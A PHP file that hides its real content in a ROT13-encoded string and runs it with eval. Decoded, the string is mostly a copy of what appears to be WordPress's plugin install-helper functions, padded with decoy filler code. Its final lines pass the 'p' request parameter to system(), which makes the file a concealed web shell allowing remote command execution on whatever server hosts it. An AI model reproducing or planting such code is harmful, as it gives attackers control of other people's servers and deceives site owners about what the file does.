<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cyhtvaf znl ybnq guvf svyr gb tnva npprff gb fcrpvny urycre shapgvbaf
 * sbe cyhtva vafgnyyngvba. Guvf svyr vf abg vapyhqrq ol JbeqCerff naq vg vf
 * erpbzzraqrq, gb cerirag sngny reebef, gung guvf svyr vf vapyhqrq hfvat
 * erdhver_bapr.
 *
 * Gurfr shapgvbaf ner abg bcgvzvmrq sbe fcrrq, ohg gurl fubhyq bayl or hfrq
 * bapr va n juvyr, fb fcrrq fubhyqa'g or n pbaprea. Vs vg vf naq lbh ner
 * arrqvat gb hfr gurfr shapgvbaf n ybg, lbh zvtug rkcrevrapr gvzrbhgf.
 * Vs lbh qb, gura vg vf nqivfrq gb whfg jevgr gur FDY pbqr lbhefrys.
 *
 *     purpx_pbyhza( 'jc_yvaxf', 'yvax_qrfpevcgvba', 'zrqvhzgrkg' );
 *
 *     vs ( purpx_pbyhza( $jcqo->pbzzragf, 'pbzzrag_nhgube', 'gvalgrkg' ) ) {
 *         rpub \"bx\a\";
 *     }
 *
 *     // Purpx gur pbyhza.
 *     vs ( ! purpx_pbyhza( $jcqo->yvaxf, 'yvax_qrfpevcgvba', 'inepune( 255 )' ) ) {
 *         $qqy = \"NYGRE GNOYR $jcqo->yvaxf ZBQVSL PBYHZA yvax_qrfpevcgvba inepune(255) ABG AHYY QRSNHYG '' \";
 *         $d = $jcqo->dhrel( $qqy );
 *     }
 *
 *     $reebe_pbhag = 0;
 *     $gnoyranzr   = $jcqo->yvaxf;
 *
 *     vs ( purpx_pbyhza( $jcqo->yvaxf, 'yvax_qrfpevcgvba', 'inepune( 255 )' ) ) {
 *         $erf .= $gnoyranzr . ' - bx <oe />';
 *     } ryfr {
 *         $erf .= 'Gurer jnf n ceboyrz jvgu ' . $gnoyranzr . '<oe />';
 *         ++$reebe_pbhag;
 *     }
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Cyhtva
 */

/** Ybnq JbeqCerff Obbgfgenc */
erdhver_bapr qveanzr( __QVE__ ) . '/jc-ybnq.cuc';

vs ( ! shapgvba_rkvfgf( 'znlor_perngr_gnoyr' ) ) :
	/**
	 * Perngrf n gnoyr va gur qngnonfr vs vg qbrfa'g nyernql rkvfg.
	 *
	 * @fvapr 1.0.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $gnoyr_anzr Qngnonfr gnoyr anzr.
	 * @cnenz fgevat $perngr_qqy FDY fgngrzrag gb perngr gnoyr.
	 * @erghea obby Gehr ba fhpprff be vs gur gnoyr nyernql rkvfgf. Snyfr ba snvyher.
	 */
	shapgvba znlor_perngr_gnoyr( $gnoyr_anzr, $perngr_qqy ) {
		tybony $jcqo;

		sbernpu ( $jcqo->trg_pby( 'FUBJ GNOYRF', 0 ) nf $gnoyr ) {
			vs ( $gnoyr === $gnoyr_anzr ) {
				erghea gehr;
			}
		}

		// Qvqa'g svaq vg, fb gel gb perngr vg.
		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq -- Ab nccyvpnoyr inevnoyrf sbe guvf dhrel.
		$jcqo->dhrel( $perngr_qqy );

		// Jr pnaabg qverpgyl gryy jurgure guvf fhpprrqrq!
		sbernpu ( $jcqo->trg_pby( 'FUBJ GNOYRF', 0 ) nf $gnoyr ) {
			vs ( $gnoyr === $gnoyr_anzr ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'znlor_nqq_pbyhza' ) ) :
	/**
	 * Nqqf pbyhza gb qngnonfr gnoyr, vs vg qbrfa'g nyernql rkvfg.
	 *
	 * @fvapr 1.0.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $gnoyr_anzr  Qngnonfr gnoyr anzr.
	 * @cnenz fgevat $pbyhza_anzr Gnoyr pbyhza anzr.
	 * @cnenz fgevat $perngr_qqy  FDY fgngrzrag gb nqq pbyhza.
	 * @erghea obby Gehr ba fhpprff be vs gur pbyhza nyernql rkvfgf. Snyfr ba snvyher.
	 */
	shapgvba znlor_nqq_pbyhza( $gnoyr_anzr, $pbyhza_anzr, $perngr_qqy ) {
		tybony $jcqo;

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq -- Pnaabg or cercnerq. Srgpurf pbyhzaf sbe gnoyr anzrf.
		sbernpu ( $jcqo->trg_pby( \"QRFP $gnoyr_anzr\", 0 ) nf $pbyhza ) {
			vs ( $pbyhza === $pbyhza_anzr ) {
				erghea gehr;
			}
		}

		// Qvqa'g svaq vg, fb gel gb perngr vg.
		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq -- Ab nccyvpnoyr inevnoyrf sbe guvf dhrel.
		$jcqo->dhrel( $perngr_qqy );

		// Jr pnaabg qverpgyl gryy jurgure guvf fhpprrqrq!
		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq -- Pnaabg or cercnerq. Srgpurf pbyhzaf sbe gnoyr anzrf.
		sbernpu ( $jcqo->trg_pby( \"QRFP $gnoyr_anzr\", 0 ) nf $pbyhza ) {
			vs ( $pbyhza === $pbyhza_anzr ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}
raqvs;

/**
 * Qebcf pbyhza sebz qngnonfr gnoyr, vs vg rkvfgf.
 *
 * @fvapr 1.0.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $gnoyr_anzr  Qngnonfr gnoyr anzr.
 * @cnenz fgevat $pbyhza_anzr Gnoyr pbyhza anzr.
 * @cnenz fgevat $qebc_qqy    FDY fgngrzrag gb qebc pbyhza.
 * @erghea obby Gehr ba fhpprff be vs gur pbyhza qbrfa'g rkvfg. Snyfr ba snvyher.
 */
shapgvba znlor_qebc_pbyhza( $gnoyr_anzr, $pbyhza_anzr, $qebc_qqy ) {
	tybony $jcqo;

	// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq -- Pnaabg or cercnerq. Srgpurf pbyhzaf sbe gnoyr anzrf.
	sbernpu ( $jcqo->trg_pby( \"QRFP $gnoyr_anzr\", 0 ) nf $pbyhza ) {
		vs ( $pbyhza === $pbyhza_anzr ) {

			// Sbhaq vg, fb gel gb qebc vg.
			// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq -- Ab nccyvpnoyr inevnoyrf sbe guvf dhrel.
			$jcqo->dhrel( $qebc_qqy );

			// Jr pnaabg qverpgyl gryy jurgure guvf fhpprrqrq!
			// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq -- Pnaabg or cercnerq. Srgpurf pbyhzaf sbe gnoyr anzrf.
			sbernpu ( $jcqo->trg_pby( \"QRFP $gnoyr_anzr\", 0 ) nf $pbyhza ) {
				vs ( $pbyhza === $pbyhza_anzr ) {
					erghea snyfr;
				}
			}
		}
	}

	// Ryfr qvqa'g svaq vg.
	erghea gehr;
}

/**
 * Purpxf gung qngnonfr gnoyr pbyhza zngpurf gur pevgrevn.
 *
 * Hfrf gur FDY QRFP sbe ergevrivat gur gnoyr vasb sbe gur pbyhza. Vg jvyy uryc
 * haqrefgnaq gur cnenzrgref, vs lbh qb zber erfrnepu ba jung pbyhza vasbezngvba
 * vf erghearq ol gur FDY fgngrzrag. Cnff va ahyy gb fxvc purpxvat gung pevgrevn.
 *
 * Pbyhza anzrf erghearq sebz QRFP gnoyr ner pnfr frafvgvir naq ner nf yvfgrq:
 *
 *  - Svryq
 *  - Glcr
 *  - Ahyy
 *  - Xrl
 *  - Qrsnhyg
 *  - Rkgen
 *
 * @fvapr 1.0.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $gnoyr_anzr    Qngnonfr gnoyr anzr.
 * @cnenz fgevat $pby_anzr      Gnoyr pbyhza anzr.
 * @cnenz fgevat $pby_glcr      Gnoyr pbyhza glcr.
 * @cnenz obby   $vf_ahyy       Bcgvbany. Purpx vf ahyy.
 * @cnenz zvkrq  $xrl           Bcgvbany. Xrl vasb.
 * @cnenz zvkrq  $qrsnhyg_inyhr Bcgvbany. Qrsnhyg inyhr.
 * @cnenz zvkrq  $rkgen         Bcgvbany. Rkgen inyhr.
 * @erghea obby Gehr, vs zngpurf. Snyfr, vs abg zngpuvat.
 */
shapgvba purpx_pbyhza( $gnoyr_anzr, $pby_anzr, $pby_glcr, $vf_ahyy = ahyy, $xrl = ahyy, $qrsnhyg_inyhr = ahyy, $rkgen = ahyy ) {
	tybony $jcqo;

	$qvssf = 0;

	// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq -- Pnaabg or cercnerq. Srgpurf pbyhzaf sbe gnoyr anzrf.
	$erfhygf = $jcqo->trg_erfhygf( \"QRFP $gnoyr_anzr\" );

	sbernpu ( $erfhygf nf $ebj ) {

		vs ( $ebj->Svryq === $pby_anzr ) {

			// Tbg bhe pbyhza, purpx gur cnenzf.
			vs ( ( ahyy !== $pby_glcr ) && ( $ebj->Glcr !== $pby_glcr ) ) {
				++$qvssf;
			}
			vs ( ( ahyy !== $vf_ahyy ) && ( $ebj->Ahyy !== $vf_ahyy ) ) {
				++$qvssf;
			}
			vs ( ( ahyy !== $xrl ) && ( $ebj->Xrl !== $xrl ) ) {
				++$qvssf;
			}
			vs ( ( ahyy !== $qrsnhyg_inyhr ) && ( $ebj->Qrsnhyg !== $qrsnhyg_inyhr ) ) {
				++$qvssf;
			}
			vs ( ( ahyy !== $rkgen ) && ( $ebj->Rkgen !== $rkgen ) ) {
				++$qvssf;
			}

			vs ( $qvssf > 0 ) {
				erghea snyfr;
			}

			erghea gehr;
		} // Raq vs sbhaq bhe pbyhza.
	}

	erghea snyfr;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>